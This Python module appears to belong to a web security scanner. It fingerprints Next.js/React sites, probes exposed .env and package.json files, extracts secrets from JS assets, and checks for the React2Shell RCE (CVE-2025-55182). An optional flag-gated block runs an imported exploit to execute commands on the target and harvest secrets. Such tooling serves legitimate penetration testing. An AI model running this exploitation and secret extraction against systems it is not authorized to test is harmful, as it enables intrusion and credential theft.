"""
React / Next.js detection module with optional React2Shell RCE exploitation.
"""

from __future__ import annotations

from app.exploits.react2shell.detector import React2ShellDetector
from app.exploits.react2shell.exploit import React2ShellExploit
from app.modules.base import body_extractions, finding_from_hit, save_http_response
from app.modules.vulnerability_intel import package_versions, react2shell_exposure
from app.storage.models import Finding, ScanContext, TargetContext
from app.utils.normalize import join_url

NEXT_PATHS = [
    "/_next/static/chunks/webpack.js",
    "/_next/static/chunks/main.js",
    "/_next/static/chunks/main-app.js",
    "/_next/static/chunks/framework.js",
    "/_next/static/chunks/app/layout.js",
    "/package.json",
    "/.env",
    "/.env.local",
    "/.env.production",
    "/robots.txt",
]

RSC_HEADER_NAMES = (
    "rsc",
    "next-router-state-tree",
    "next-router-prefetch",
    "next-url",
    "x-nextjs-cache",
    "x-nextjs-request-id",
)


class ReactModule:
    name = "react"

    def match(self, target: TargetContext) -> bool:
        return bool(target.live)

    def run(self, target: TargetContext, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        http = ctx.http
        tech = set(target.tech or [])
        ctx.progress.module_set_total(self.name, len(NEXT_PATHS) + 2)

        home = http.get(target.url)
        ctx.progress.tick(
            success=not bool(home.error),
            timeout=bool(home.error and "timeout" in home.error),
            module=self.name,
        )
        if home.status_code == 200 and home.text:
            if "__NEXT_DATA__" in home.text or "/_next/static/" in home.text:
                tech.update({"nextjs", "react"})
                extracted = body_extractions(ctx, home.url or target.url, home.text)
                findings.append(
                    finding_from_hit(
                        module=self.name,
                        ftype="other",
                        severity="info",
                        target=target,
                        url=home.url or target.url,
                        title="Next.js application detected",
                        evidence="__NEXT_DATA__ or /_next/static present",
                        confidence=0.9,
                        extracted=extracted,
                        tags=["nextjs", "react", "fingerprint"],
                    )
                )
                ctx.progress.add_hit(secrets=len(extracted.get("secrets", [])), module=self.name)
                if extracted.get("secrets") or extracted.get("apis"):
                    raw_ref = save_http_response(ctx, "next_home", home)
                    findings.append(
                        finding_from_hit(
                            module=self.name,
                            ftype="js_secret",
                            severity="high",
                            target=target,
                            url=home.url or target.url,
                            title="Secrets/APIs in Next.js HTML bootstrap",
                            evidence=home.text[:200],
                            confidence=0.8,
                            extracted=extracted,
                            raw_ref=raw_ref,
                            tags=["nextjs", "extract"],
                        )
                    )

        live_headers = {k.lower(): v for k, v in (home.headers or {}).items()}
        cached_headers = {k.lower(): v for k, v in (target.headers or {}).items()}
        merged = {**cached_headers, **live_headers}
        rsc_headers = sorted(name for name in RSC_HEADER_NAMES if name in merged)
        ctx.progress.tick(success=True, module=self.name)
        if rsc_headers:
            tech.update({"nextjs", "react", "rsc"})
            raw_ref = save_http_response(ctx, "next_rsc_headers", home)
            findings.append(
                finding_from_hit(
                    module=self.name,
                    ftype="other",
                    severity="medium",
                    target=target,
                    url=home.url or target.url,
                    title="React Server Components surface headers present",
                    evidence=", ".join(rsc_headers),
                    confidence=0.8,
                    raw_ref=raw_ref,
                    tags=["nextjs", "rsc", "react2shell", "detection-only"],
                )
            )
            ctx.progress.add_hit(module=self.name)

        for path in NEXT_PATHS:
            if ctx.stop_event.is_set():
                break
            url = join_url(target.url, path)
            resp = http.get(url)
            timed_out = bool(resp.error and "timeout" in resp.error)
            ctx.progress.tick(success=not bool(resp.error), timeout=timed_out, module=self.name)
            if resp.error or resp.soft404 or resp.status_code != 200:
                continue
            body = resp.text or ""

            if path == "/package.json":
                versions = package_versions(body)
                if versions:
                    tech.update({"nextjs", "react"})
                    raw_ref = save_http_response(ctx, "next_package_json", resp)
                    findings.append(
                        finding_from_hit(
                            module=self.name,
                            ftype="path",
                            severity="medium",
                            target=target,
                            url=resp.url or url,
                            title="Exposed package.json with React/Next versions",
                            evidence=", ".join(f"{name}@{ver}" for name, ver in sorted(versions.items())),
                            confidence=0.9,
                            extracted={"versions": versions},
                            raw_ref=raw_ref,
                            tags=["nextjs", "package-json", "version-check"],
                        )
                    )
                    ctx.progress.add_hit(module=self.name)
                    for package, version in versions.items():
                        exposure = react2shell_exposure(package, version)
                        if not exposure:
                            continue
                        findings.append(
                            finding_from_hit(
                                module=self.name,
                                ftype="vuln",
                                severity=exposure["severity"],
                                target=target,
                                url=resp.url or url,
                                title=f"React2Shell affected package version: {package}@{version}",
                                evidence=(
                                    f"{package} {version} matches {'/'.join(exposure['cves'])}; "
                                    f"remediation: {exposure['fixed']}"
                                ),
                                confidence=0.92,
                                extracted=exposure,
                                raw_ref=raw_ref,
                                tags=["nextjs", "react2shell", "cve-2025-55182", "detection-only"],
                                validated=True,
                            )
                        )
                        ctx.progress.add_hit(module=self.name)
                continue

            if path.startswith("/.env") and ("=" in body or "KEY" in body.upper()):
                extracted = body_extractions(ctx, resp.url or url, body)
                raw_ref = save_http_response(ctx, f"next_env_{path}", resp)
                findings.append(
                    finding_from_hit(
                        module=self.name,
                        ftype="env",
                        severity="critical",
                        target=target,
                        url=resp.url or url,
                        title=f"Exposed Next.js env file {path}",
                        evidence=body[:300],
                        confidence=0.95,
                        extracted=extracted,
                        raw_ref=raw_ref,
                        tags=["nextjs", "env"],
                        validated=True,
                    )
                )
                ctx.progress.add_hit(secrets=len(extracted.get("secrets", [])), module=self.name)
                continue

            if "/_next/" in path:
                tech.update({"nextjs", "react"})
                if "chunks/app/" in path:
                    raw_ref = save_http_response(ctx, f"next_app_{path}", resp)
                    findings.append(
                        finding_from_hit(
                            module=self.name,
                            ftype="other",
                            severity="info",
                            target=target,
                            url=resp.url or url,
                            title="Next.js App Router asset exposed",
                            evidence=path,
                            confidence=0.75,
                            raw_ref=raw_ref,
                            tags=["nextjs", "app-router", "detection-only"],
                        )
                    )
                    ctx.progress.add_hit(module=self.name)
                extracted = body_extractions(ctx, resp.url or url, body)
                if extracted.get("secrets") or extracted.get("apis") or extracted.get("smtp"):
                    raw_ref = save_http_response(ctx, f"next_{path}", resp)
                    findings.append(
                        finding_from_hit(
                            module=self.name,
                            ftype="js_secret",
                            severity="high",
                            target=target,
                            url=resp.url or url,
                            title=f"Secrets/APIs in Next asset {path}",
                            evidence=body[:200],
                            confidence=0.85,
                            extracted=extracted,
                            raw_ref=raw_ref,
                            tags=["nextjs", "js"],
                        )
                    )
                    ctx.progress.add_hit(secrets=len(extracted.get("secrets", [])), module=self.name)

        detector = React2ShellDetector(http, target.url)
        scan = detector.scan(home if home.status_code == 200 else None)
        if scan.get("rsc_surface_active"):
            findings.append(
                finding_from_hit(
                    module=self.name,
                    ftype="other",
                    severity="medium",
                    target=target,
                    url=home.url or target.url,
                    title="React2Shell RSC action surface active (next.txt PoC fingerprint)",
                    evidence=(
                        f"headers={','.join(scan.get('rsc_headers') or [])}; "
                        f"next_action={scan.get('next_action_accepts')}; "
                        f"markers={','.join(scan.get('response_markers') or [])}; "
                        f"poc={scan.get('poc_source')}"
                    ),
                    confidence=0.86,
                    extracted=scan,
                    tags=["nextjs", "react2shell", "rsc", "detection-only"],
                )
            )
            ctx.progress.add_hit(module=self.name)

        # ===== ACTIVE EXPLOITATION =====
        if ctx.exploit_enabled and ("nextjs" in tech or "react" in tech):
            exploit = React2ShellExploit(http, target.url)
            success, output = exploit.run(ctx.exploit_command or "id")
            if success:
                findings.append(
                    finding_from_hit(
                        module=self.name,
                        ftype="vuln",
                        severity="critical",
                        target=target,
                        url=target.url,
                        title="Next.js RCE via React2Shell (active)",
                        evidence=f"Command output:\n{output[:500]}",
                        confidence=1.0,
                        tags=["nextjs", "rce", "react2shell", "active-exploit"],
                        validated=True,
                    )
                )
                ctx.progress.add_hit(module=self.name)
                secrets = exploit.extract_secrets(ctx)
                for category, lines in secrets.items():
                    if lines:
                        findings.append(
                            finding_from_hit(
                                module=self.name,
                                ftype="secrets",
                                severity="high",
                                target=target,
                                url=target.url,
                                title=f"Secret extraction: {category} (React2Shell)",
                                evidence="\n".join(lines[:20]),
                                confidence=0.95,
                                tags=["nextjs", "secrets", category, "active-exploit"],
                                validated=True,
                            )
                        )
                        ctx.progress.add_hit(secrets=len(lines), module=self.name)

        return findings
